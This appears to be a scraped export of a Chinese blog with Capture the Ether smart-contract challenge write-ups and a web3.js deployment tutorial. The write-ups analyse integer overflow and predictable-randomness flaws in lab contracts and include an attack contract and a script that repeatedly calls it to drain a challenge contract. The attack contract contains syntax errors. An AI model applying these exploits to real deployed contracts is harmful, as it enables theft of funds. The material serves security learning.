^0.4.21;contract TokenWhaleChallenge &#123; address player; uint256 public totalSupply; mapping(address =&gt; uint256) public balanceOf; mapping(address =&gt; mapping(address =&gt; uint256)) public allowance; string public name = &quot;Simple ERC20 Token&quot;; string public symbol = &quot;SET&quot;; uint8 public decimals = 18; function TokenWhaleChallenge(address _player) public &#123; player = _player; // 发行量是 1000 totalSupply = 1000; // 初始化玩家的代币为 1000 balanceOf[player] = 1000; &#125; // 通关要求：需要玩家的代币 &gt;= 1000000 function isComplete() public view returns (bool) &#123; return balanceOf[player] &gt;= 1000000; &#125; // 触发事件 谁向谁转了多少 value event Transfer(address indexed from, address indexed to, uint256 value); //内部的 发送函数 -- 将合约调用者的代币转移给 接收方to function _transfer(address to, uint256 value) internal &#123; // 这里减的是 合约调用者的代币 // 只要这里的msg.sender 不是 同一个地址，那么预防不了溢出这个漏洞 balanceOf[msg.sender] -= value; // 这里要注意 balanceOf[to] += value; emit Transfer(msg.sender, to, value); &#125; // 外部的交易函数，将调用者的代币发送给接收者to function transfer(address to, uint256 value) public &#123; // 确保调用者的钱足够发送 require(balanceOf[msg.sender] &gt;= value); // 这个是？？？？为了防止上溢？？？ require(balanceOf[to] + value &gt;= balanceOf[to]); _transfer(to, value); &#125; event Approval(address indexed owner, address indexed spender, uint256 value); // 授权额度 function approve(address spender, uint256 value) public &#123; allowance[msg.sender][spender] = value; emit Approval(msg.sender, spender, value); &#125; function transferFrom(address from, address to, uint256 value) public &#123; // 检查的是 from 这个地址的代币 // 安全隐患：相当于 小王和小李，只要小王有钱我就可以一直从小李那里取钱 require(balanceOf[from] &gt;= value); // 这个校验很容易通过，我感觉是只要不弄溢出就没事 require(balanceOf[to] + value &gt;= balanceOf[to]); // 调用 approve函数，让 from 给合约调用者授权 require(allowance[from][msg.sender] &gt;= value); allowance[from][msg.sender] -= value; // 让to 和 msg.sender不一致，破解它那简简单单的保护措施，to可以随便乱填一个地址 _transfer(to, value); &#125;&#125; 2.2 本题的目标就是 balanceOf[player] &gt;= 1000000 而合约中的代币发行量只有 1000 那么多，显然只通过简单的转账操作是不可能实现的，所以，只能往溢出的方向去思考 2.3 而合约中能产生溢出的且涉及到 balanceOf 的只有 _transfer 函数中的 balanceOf[msg.sender] -= value; 这个可以产生溢出，生成很多很多代币。 2.4 合约中调用此内部函数的方法只有 transfer 和 transferFrom 。细看可知 transfer 函数中 有require(balanceOf[msg.sender] &gt;= value)检验，这个检验让这个函数变得安全，因为它和 _transfer函数中的balanceOf[msg.sender] -= value;的msg.sender 保持一致，无法进行溢出操作 2.5 transferFrom 合约中有三个校验 12345678910// 检查的是 from 这个地址的代币 // 安全隐患：相当于 小王和小李，只要小王有钱我就可以一直从小李那里取钱 require(balanceOf[from] &gt;= value); // 这个校验很容易通过，我感觉是只要不弄溢出就没事 require(balanceOf[to] + value &gt;= balanceOf[to]); // 调用 approve函数，让 from 给合约调用者授权 require(allowance[from][msg.sender] &gt;= value); 2.6 我们可知，它校验的是from 地址 ，但是 _transfer 合约中操作的是 msg.sender 这就有了操作空间，只要别人有钱我们就可以通过校验执行以下的一系列操作 值得注意的是方法的形参的 to 不能和当前的合约调用者一致，否则他会被_transfer函数中的小小保护机制给还原回去的，我之前就试过 3. 解题 3.1 给函数填入参数 3.2 首先要通过第一个校验：可以用玩家地址（balanceOf[play] &#x3D; 1000）作为 from ，这样就可以通过第一个校验了 3.3 to 随便填一个地址就可以，只要不和msg.sender 是同一个地址就行 3.4 要通过第二个校验，就需要 allowance[from][msg.sender] &gt;= value ，所以需要先调用approve 函数，将调用者地址合约切回 玩家地址，spender就是 你等下要使用的msg.sender，然后随便授权，我这里授权一块钱，因为一个很简单溢出就是 0 - 1 3.5 调用之后，查看 balanceOf[msg.sender] 3.6 再调用 transfer 函数，从 msg.sender 转 钱 给 玩家 player 通过！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Token sale","slug":"Smart contracts/capther the ether/Token sale","date":"2023-04-12T06:01:10.000Z","updated":"2023-04-12T06:01:10.000Z","comments":true,"path":"2023/04/12/Smart contracts/capther the ether/Token sale/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/12/Smart%20contracts/capther%20the%20ether/Token%20sale/","excerpt":"","text":"Token sale1. 题目 1.1 This token contract allows you to buy and sell tokens at an even exchange rate of 1 token per ether. The contract starts off with a balance of 1 ether. See if you can take some of that away. 1.2 源码： 123456789101112131415161718192021222324252627pragma solidity ^0.4.21;contract TokenSaleChallenge &#123; mapping(address =&gt; uint256) public balanceOf; uint256 constant PRICE_PER_TOKEN = 1 ether; function TokenSaleChallenge(address _player) public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance &lt; 1 ether; &#125; function buy(uint256 numTokens) public payable &#123; require(msg.value == numTokens * PRICE_PER_TOKEN); balanceOf[msg.sender] += numTokens; &#125; function sell(uint256 numTokens) public &#123; require(balanceOf[msg.sender] &gt;= numTokens); balanceOf[msg.sender] -= numTokens; msg.sender.transfer(numTokens * PRICE_PER_TOKEN); &#125;&#125; 2. 分析 2.1 分析代码可知，如果按部就班来操作（即 用相同的钱来买相同的代币是行不通的—-因为 buy 函数中的require(msg.value == numTokens * PRICE_PER_TOKEN); balanceOf[msg.sender] += numTokens; 和 sell 函数中的 require(balanceOf[msg.sender] &gt;= numTokens); balanceOf[msg.sender] -= numTokens; 限制了你存多少取多少，不能存少取多） 2.2 所以按部就班行不通，但是我们只能往存少取的方向取考虑，这就涉及了溢出的问题 2.3 以 uint8为例子，我们可以知道 在uint8 的加法中 123&gt;254 + 1 = 255&gt;254 + 2 = 0&gt;254 + 3 = 1 我在remix中尝试过，直接显示的写 uint8 = 255 + 1 是会被编译器检测出来的，但是隐式的写则不会即 12&gt;uint8 a = 255;&gt;uint8 b = a + 1; 这样输出的结果是 0； 在uint8 的乘法中 12&gt;51 * 5 = 255&gt;51 * 6 = 50 51 * 6 = 50 可以根据加法拆分为 51 * 6 = 51 * (5 + 1) = 51 * 5 + 51 = 255 + 1 + 50 = 50 我的理解是超过 255重新计数，因为uint8 的取值范围是 [0,255] 256 位，所以超过255 的部分又从 0 开始。 同理 uint256 类型也是如此，uint256的取值范围是[0,115792089237316195423570985008687907853269984665640564039457584007913129639935] 2.4 我们本着存少取多的原则，让 require(msg.value == numTokens * PRICE_PER_TOKEN); 中的 numTokens * PRICE_PER_TOKEN 发生溢出，我们就可以实现花费少的主币获取更多的代币 2.5 在合约中主币是以 wei为单位的 也就是说 uint256 constant PRICE_PER_TOKEN = 1 ether = 10^18 wei 我们就需要计算出溢出的门槛是多少 ，计算如下： 1234567//115792089237316195423570985008687907853269984665640564039457584007913129639935uint256 result = 2**256 - 1;//115792089237316195423570985008687907853269984665640564039457uint256 temp = result / 10**18;// 此时给temp 的值加 1 应该是触发溢出的最低门槛uint256 money = (temp + 1) * 10**18; //money=415992086870360064 在remix上测试得： 2.6 然后再调用buy函数的时候，以 temp+1的值作为参数传入，money的值作为msg.value 2.7 以 1 为参数调用 sell函数 解题成功 3. 解题解题过程如上述分析","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"solidity的整数溢出","slug":"Solidity/Basic_Knowledge/solidity的整数溢出","date":"2023-04-12T06:01:10.000Z","updated":"2023-04-12T06:01:10.000Z","comments":true,"path":"2023/04/12/Solidity/Basic_Knowledge/solidity的整数溢出/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/12/Solidity/Basic_Knowledge/solidity%E7%9A%84%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/","excerpt":"","text":"solidity的整数溢出资料收集中：文章一","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Basic_Knowledge","slug":"Solidity/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Solidity/Basic-Knowledge/"}],"tags":[{"name":"整数溢出","slug":"整数溢出","permalink":"https://biyouqiuqiu.com/tags/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/"}]},{"title":"web3 学习总结","slug":"Web3/Basic_Knowledge/web3 学习总结","date":"2023-04-12T02:47:10.000Z","updated":"2023-04-12T02:47:10.000Z","comments":true,"path":"2023/04/12/Web3/Basic_Knowledge/web3 学习总结/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/12/Web3/Basic_Knowledge/web3%20%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/","excerpt":"","text":"web3 学习总结1. 合约的部署 – 需要发送主币，以及传入参数以一个冒泡排序合约为例 合约代码： 1234567891011121314151617181920212223242526272829303132// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract sort &#123; uint[] arr; constructor(uint[] memory arrays) payable &#123; require(msg.value == 1); arr = arrays; &#125; function bubSort() external returns(uint[] memory) &#123; bool flag; uint temp; for (uint i = 0; i &lt; arr.length - 1; i++) &#123; flag = true; for (uint j = 0; j &lt; arr.length - i - 1; j++) &#123; if(arr[j] &gt; arr[j + 1]) &#123; temp = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = temp; flag = false; &#125; &#125; if (flag) &#123; break; &#125; &#125; return arr; &#125;&#125; 1.1 在 remix 中复制合约的 ABI 和 byteCode 1.2 在 vscode 上编写代码，创建 sort.abi 和 sort.js 文件 1.3 在 根据 获取的交易哈希，在 ganache 上找到相应的合约地址 1.4 在remix 上验证部署出来的合约地址是否真实，合约中是有主币的，所以是正确的 部署合约的代码： 12345678910111213141516171819202122let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));var fs = require(&quot;fs&quot;);var sortABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\temp\\\\sort.abi&quot;),toString());var contract = new web.eth.Contract(sortABI);var byteCode = &quot;0x60806040526040516106f33803806106f38339818101604052810190610025919061025c565b6001341461003257600080fd5b806000908051906020019061004892919061004f565b50506102a5565b82805482825590600052602060002090810192821561008b579160200282015b8281111561008a57825182559160200191906001019061006f565b5b509050610098919061009c565b5090565b5b808211156100b557600081600090555060010161009d565b5090565b6000604051905090565b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b61011b826100d2565b810181811067ffffffffffffffff8211171561013a576101396100e3565b5b80604052505050565b600061014d6100b9565b90506101598282610112565b919050565b600067ffffffffffffffff821115610179576101786100e3565b5b602082029050602081019050919050565b600080fd5b6000819050919050565b6101a28161018f565b81146101ad57600080fd5b50565b6000815190506101bf81610199565b92915050565b60006101d86101d38461015e565b610143565b905080838252602082019050602084028301858111156101fb576101fa61018a565b5b835b81811015610224578061021088826101b0565b8452602084019350506020810190506101fd565b5050509392505050565b600082601f830112610243576102426100cd565b5b81516102538482602086016101c5565b91505092915050565b600060208284031215610272576102716100c3565b5b600082015167ffffffffffffffff8111156102905761028f6100c8565b5b61029c8482850161022e565b91505092915050565b61043f806102b46000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063283fdc7814610030575b600080fd5b61003861004e565b60405161004591906102d9565b60405180910390f35b606060008060005b6001600080549050610068919061032a565b8110156101b8576001925060005b600182600080549050610089919061032a565b610093919061032a565b81101561019f5760006001826100a9919061035e565b815481106100ba576100b9610392565b5b9060005260206000200154600082815481106100d9576100d8610392565b5b9060005260206000200154111561018c57600081815481106100fe576100fd610392565b5b90600052602060002001549250600060018261011a919061035e565b8154811061012b5761012a610392565b5b90600052602060002001546000828154811061014a57610149610392565b5b9060005260206000200181905550826000600183610168919061035e565b8154811061017957610178610392565b5b9060005260206000200181905550600093505b8080610197906103c1565b915050610076565b50826101b85780806101b0906103c1565b915050610056565b50600080548060200260200160405190810160405280929190818152602001828054801561020557602002820191906000526020600020905b8154815260200190600101908083116101f1575b50505050509250505090565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b6000819050919050565b6102508161023d565b82525050565b60006102628383610247565b60208301905092915050565b6000602082019050919050565b600061028682610211565b610290818561021c565b935061029b8361022d565b8060005b838110156102cc5781516102b38882610256565b97506102be8361026e565b92505060018101905061029f565b5085935050505092915050565b600060208201905081810360008301526102f3818461027b565b905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60006103358261023d565b91506103408361023d565b9250828203905081811115610358576103576102fb565b5b92915050565b60006103698261023d565b91506103748361023d565b925082820190508082111561038c5761038b6102fb565b5b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b60006103cc8261023d565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036103fe576103fd6102fb565b5b60018201905091905056fea264697066735822122040692a2976cbd61653fb0d4195fa70c62b232f3d9b74fdf1f80f9e5bbada103c64736f6c63430008130033&quot;;// 部署合约的代码contract.deploy(&#123; data: byteCode, arguments: [[5,4,3,2,1]]&#125;).send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, gas: 4700000, value: 1&#125;,function(err,result)&#123; console.log(&quot;合约部署得到的交易哈希为：&quot;); console.log(result);&#125;) 2.1 调用合约的函数，payable函数 2.1 调用 bubSort函数，对数组进行排序 123456789101112// 调用合约函数var address = &quot;0x2A5cd706Ca94C6655197e6C05C8610CA04Ac8569&quot;;var contract = new web.eth.Contract(sortABI,address);contract.methods.bubSort().send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, value: 1&#125;).on(&#x27;receipt&#x27;,function(result)&#123; console.log(result);&#125;) 执行结果： 2.2 执行之后获得交易的哈希，并在ganache上查看 2.3 将交易哈希通过 remix 上的debug 来查看合约中的变量 我们可以发现，传入的数组为[5,4,3,2,1] 调用排序函数之后，数组变成了[1,2,3,4,5] 说明执行成功 2.4 完整的代码： 1234567891011121314151617181920212223242526272829303132333435363738394041let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));var fs = require(&quot;fs&quot;);var sortABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\temp\\\\sort.abi&quot;),toString());var contract = new web.eth.Contract(sortABI);// var byteCode = &quot;60806040526040516106e63803806106e68339818101604052810190610025919061025c565b6001341461003257600080fd5b806000908051906020019061004892919061004f565b50506102a5565b82805482825590600052602060002090810192821561008b579160200282015b8281111561008a57825182559160200191906001019061006f565b5b509050610098919061009c565b5090565b5b808211156100b557600081600090555060010161009d565b5090565b6000604051905090565b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b61011b826100d2565b810181811067ffffffffffffffff8211171561013a576101396100e3565b5b80604052505050565b600061014d6100b9565b90506101598282610112565b919050565b600067ffffffffffffffff821115610179576101786100e3565b5b602082029050602081019050919050565b600080fd5b6000819050919050565b6101a28161018f565b81146101ad57600080fd5b50565b6000815190506101bf81610199565b92915050565b60006101d86101d38461015e565b610143565b905080838252602082019050602084028301858111156101fb576101fa61018a565b5b835b81811015610224578061021088826101b0565b8452602084019350506020810190506101fd565b5050509392505050565b600082601f830112610243576102426100cd565b5b81516102538482602086016101c5565b91505092915050565b600060208284031215610272576102716100c3565b5b600082015167ffffffffffffffff8111156102905761028f6100c8565b5b61029c8482850161022e565b91505092915050565b610432806102b46000396000f3fe60806040526004361061001e5760003560e01c8063283fdc7814610023575b600080fd5b61002b610041565b60405161003891906102cc565b60405180910390f35b606060008060005b600160008054905061005b919061031d565b8110156101ab576001925060005b60018260008054905061007c919061031d565b610086919061031d565b81101561019257600060018261009c9190610351565b815481106100ad576100ac610385565b5b9060005260206000200154600082815481106100cc576100cb610385565b5b9060005260206000200154111561017f57600081815481106100f1576100f0610385565b5b90600052602060002001549250600060018261010d9190610351565b8154811061011e5761011d610385565b5b90600052602060002001546000828154811061013d5761013c610385565b5b906000526020600020018190555082600060018361015b9190610351565b8154811061016c5761016b610385565b5b9060005260206000200181905550600093505b808061018a906103b4565b915050610069565b50826101ab5780806101a3906103b4565b915050610049565b5060008054806020026020016040519081016040528092919081815260200182805480156101f857602002820191906000526020600020905b8154815260200190600101908083116101e4575b50505050509250505090565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b6000819050919050565b61024381610230565b82525050565b6000610255838361023a565b60208301905092915050565b6000602082019050919050565b600061027982610204565b610283818561020f565b935061028e83610220565b8060005b838110156102bf5781516102a68882610249565b97506102b183610261565b925050600181019050610292565b5085935050505092915050565b600060208201905081810360008301526102e6818461026e565b905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061032882610230565b915061033383610230565b925082820390508181111561034b5761034a6102ee565b5b92915050565b600061035c82610230565b915061036783610230565b925082820190508082111561037f5761037e6102ee565b5b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b60006103bf82610230565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036103f1576103f06102ee565b5b60018201905091905056fea2646970667358221220ae8c4b8dcba12a3c05b294a45463cdbfcc21cbcdcfe3c2160fd3b8e26fa8304a64736f6c63430008130033&quot;;// 部署合约的代码// contract.deploy(&#123;// data: byteCode,// arguments: [[5,4,3,2,1]]// &#125;).send(&#123;// from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;,// gas: 4700000,// value: 1// &#125;,function(err,result)&#123;// console.log(&quot;合约部署得到的交易哈希为：&quot;);// console.log(result);// &#125;)// 调用合约函数var address = &quot;0x2A5cd706Ca94C6655197e6C05C8610CA04Ac8569&quot;;var contract = new web.eth.Contract(sortABI,address);contract.methods.bubSort().send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, value: 1&#125;).on(&#x27;receipt&#x27;,function(result)&#123; console.log(result);&#125;)// var answer;// web.eth.getStorageAt(address,0,(err,result)=&gt;&#123;// answer = web.utils.hexToNumber(result);// console.log(answer);// &#125;) tips:如果函数需要传参，直接在调用函数的时候传入就可以了，如下：","categories":[{"name":"Web3","slug":"Web3","permalink":"https://biyouqiuqiu.com/categories/Web3/"},{"name":"Basic_Knowledge","slug":"Web3/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Web3/Basic-Knowledge/"}],"tags":[{"name":"学习总结","slug":"学习总结","permalink":"https://biyouqiuqiu.com/tags/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"},{"name":"Web3","slug":"Web3","permalink":"https://biyouqiuqiu.com/tags/Web3/"}]},{"title":"Predict the block hash","slug":"Smart contracts/capther the ether/Predict the block hash","date":"2023-04-10T06:01:10.000Z","updated":"2023-04-10T06:01:10.000Z","comments":true,"path":"2023/04/10/Smart contracts/capther the ether/Predict the block hash/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/10/Smart%20contracts/capther%20the%20ether/Predict%20the%20block%20hash/","excerpt":"","text":"Predict the block hash1. 题目 1.1 题目： Guessing an 8-bit number is apparently too easy. This time, you need to predict the entire 256-bit block hash for a future block 1.2 源码： 123456789101112131415161718192021222324252627282930313233343536pragma solidity ^0.4.21;contract PredictTheBlockHashChallenge &#123; address guesser; bytes32 guess; uint256 settlementBlockNumber; function PredictTheBlockHashChallenge() public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function lockInGuess(bytes32 hash) public payable &#123; require(guesser == 0); require(msg.value == 1 ether); guesser = msg.sender; guess = hash; settlementBlockNumber = block.number + 1; &#125; function settle() public &#123; require(msg.sender == guesser); require(block.number &gt; settlementBlockNumber); bytes32 answer = block.blockhash(settlementBlockNumber); guesser = 0; if (guess == answer) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. 分析 2.1 分析代码可知，该题和上一题差不多，这题要猜测的数是 256位的，即byte32类型 2.2 这题是需要预测下一个块哈希的块号，显然是不可能的，但是 官方文档对 block.blockhash 是这样定义和解释的 具体是什么意思呢，我去网上搜的解释是，他只能得到256个区块内的哈希值，一旦超过256的区块，就无法返回对应的区块哈希，只会返回零—-我的理解是：如果题目中的 answer 是在 block.number &#x3D; 0 时设置的，当此时的block.number &gt;&#x3D; 256时，再去计算 block.blockhash(settlementBlockNumber) 这个值就是 block.blockhash(0) 的值了（settlementBlockNumber &#x3D; block.number + 1） 2.3 解题思路就是，当我们调用 lockInGuess() 函数，以 0 的hash 作为参数传入该函数中，过一段时间后，再调用 settle() 函数，具体等多久我也不知道 3. 解题","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Predict the future","slug":"Smart contracts/capther the ether/Predict the future","date":"2023-04-10T04:01:10.000Z","updated":"2023-04-10T04:01:10.000Z","comments":true,"path":"2023/04/10/Smart contracts/capther the ether/Predict the future/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/10/Smart%20contracts/capther%20the%20ether/Predict%20the%20future/","excerpt":"","text":"Predict the future1. 题目 1.1 This time, you have to lock in your guess before the random number is generated. To give you a sporting chance, there are only ten possible answers. Note that it is indeed possible to solve this challenge without losing any ether. 1.2 源码： 123456789101112131415161718192021222324252627282930313233343536pragma solidity ^0.4.21;contract PredictTheFutureChallenge &#123; address guesser; uint8 guess; uint256 settlementBlockNumber; function PredictTheFutureChallenge() public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function lockInGuess(uint8 n) public payable &#123; require(guesser == 0); require(msg.value == 1 ether); guesser = msg.sender; guess = n; settlementBlockNumber = block.number + 1; &#125; function settle() public &#123; require(msg.sender == guesser); require(block.number &gt; settlementBlockNumber); uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10; guesser = 0; if (guess == answer) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. 分析 2.1 该题需要提前锁定答案，再验证答案（即，先调用 lockInGuess 函数再调用 settle 函数）；很显然这样是猜不出来的，但是由 uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10; 可知，answer 的值只用十个可能，即 [0,9] 2.2 我们可以先确定我们自己设定的 answer ，改变题目要求中的 answer ，通过不断改变 block.number 和 时间戳来改变题目中的 answer （调用其他合约时，是在同一块区块中进行的，也就是为我们确定唯一的 block.number 和 时间戳） 2.3 编写一个攻击合约， 123456789101112131415161718192021222324contract attack&#123; PredictTheFutureChallenge pre; uint8 public answer=5; function attack(address _addr)public&#123; pre = PredictTheFutureChallenge(_addr); &#125; function lock()public payable&#123; pre.lockInGuess.value(1 ether)(answer); &#125; function att()public&#123; uint8 temp = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10; if(temp == answer)&#123; pre.settle(); &#125; require(pre.isComplete())&#123; tx.orgin.transfer(address(this).balance); &#125; &#125; function()external payable&#123; &#125;&#125; 2.4 先锁定我们的答案（调用lock() 函数），不停的调用att() 函数，直到 PredictTheFutureChallenge 合约中的 isComplete 函数的值返回的是 true 或 合约的余额为 0 3. 解题 3.1 使用 Web3解题（因为remix的bug实在是太多了），先在 remix部署合约，获取相对应的合约地址 tips：部署一个 attack 合约之后，如果执行了lock 函数就不能在不重新部署 PredictTheFutureChallenge合约的基础上使用新合约调用lock函数，因为guesser已经被赋值了，稍后的require 将不能通过 3.2 在我的 vscode上面疯狂执行 att 函数，直到remix上 isComplete返回的值发生改变，合约的金额转移为止，如图： 3.3 在 vscode 上的代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));var fs = require(&quot;fs&quot;);var contractABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\靶场\\\\capturetheether\\\\abi\\\\PredictTheFutureChallengeHack.abi&quot;),toString());// var contractADD = &quot;0x80F5D36E412076Dd758961d729D8F84dc6c34A46&quot;;var contractADD = &quot;0xD52d9e548C6d18445a465dd08b5b2B47ca449Ee9&quot;; // Hack_Addressvar contract = new web.eth.Contract(contractABI,contractADD);// console.log(contract);var balance = web.eth.getBalance(contractADD,function(err,result)&#123;console.log(result);&#125;);// console.log(balance);// 00000000000000000000000580f5d36e412076dd758961d729d8f84dc6c34a46var answer;web.eth.getStorageAt(contractADD,0,(err,result)=&gt;&#123; // answer = web.utils.hexToNumber(result); console.log(&quot;这个是结果：&quot; + result);&#125;)// contract.methods.lock().send(&#123;// from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;,// value: 1000000000000000000// &#125;).on(&quot;receipt&quot;,function(result)&#123;// console.log(result);// &#125;)contract.methods.att().send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, // value: 1000000000000000000&#125;).on(&quot;receipt&quot;,function(result)&#123; console.log(result);&#125;)","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Guess the new number","slug":"Smart contracts/capther the ether/Guess the new number","date":"2023-04-07T01:47:10.000Z","updated":"2023-04-07T01:47:10.000Z","comments":true,"path":"2023/04/07/Smart contracts/capther the ether/Guess the new number/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/07/Smart%20contracts/capther%20the%20ether/Guess%20the%20new%20number/","excerpt":"","text":"Guess the new number1. 题目 1.1 要求： The number is now generated on-demand when a guess is made 1.2 题目代码： 1234567891011121314151617181920pragma solidity ^0.4.21;contract GuessTheNewNumberChallenge &#123; function GuessTheNewNumberChallenge() public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function guess(uint8 n) public payable &#123; require(msg.value == 1 ether); uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)); if (n == answer) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. 分析 2.1 分析代码可知，answer是在执行 guess 函数的之后才会被赋值，也就是说不能直接通过 web3 和合约交互获取 answer ，但是我们知道同一块区块中的时间戳是同一个，也就是说让 guess 函数和自己的答案在同一个合约中 2.1 什么意思呢，简单来说就是 answer 的定义为： uint8 answer = uint8(uint256(keccak256(block.blockhash(block.number - 1), now))); (其中 now 就是旧版本的时间戳，现在获取时间戳的方法是：block.timestamp ) 3. 解题","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Guess the random number","slug":"Smart contracts/capther the ether/Guess the random number","date":"2023-04-05T04:59:10.000Z","updated":"2023-04-05T04:59:10.000Z","comments":true,"path":"2023/04/05/Smart contracts/capther the ether/Guess the random number/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/05/Smart%20contracts/capther%20the%20ether/Guess%20the%20random%20number/","excerpt":"","text":"Guess the random number1. 题目 1.1 This time the number is generated based on a couple fairly random sources 1.2 题目代码： 1234567891011121314151617181920212223// SPDX-License-Identifier: MITpragma solidity ^0.4.21;contract GuessTheRandomNumberChallenge &#123; uint8 answer; function GuessTheRandomNumberChallenge() public payable &#123; require(msg.value == 1 ether); answer = uint8(keccak256(block.blockhash(block.number - 1), now)); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function guess(uint8 n) public payable &#123; require(msg.value == 1 ether); if (n == answer) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. 分析 2.1 题目代码中的 answer 是随机生成的，及根据创建的时候区块号和当时的时间 now 来打的时间戳。 2.2 